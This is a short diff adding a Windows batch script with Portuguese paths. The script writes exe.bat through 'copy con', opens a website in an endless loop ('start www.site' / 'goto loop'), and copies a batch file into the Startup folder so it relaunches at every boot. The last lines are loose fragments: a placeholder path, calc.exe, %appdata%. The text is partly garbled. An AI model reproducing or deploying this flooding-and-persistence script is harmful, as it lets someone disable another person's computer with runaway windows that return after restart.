@@ -1,0 +1,15 @@
+color 0a
+cls
+cd desktop
+md pasta
+copy con exe.bat
+:loop
+start www.site
+goto loop
+^z
+start exe.bat
+exit
+copy /y teste.bat "caminho do inicializar"
+C:\Documents and Settings\All Users\Menu Iniciar\Programas\Inicializar
+calc.exe
+%appdata%
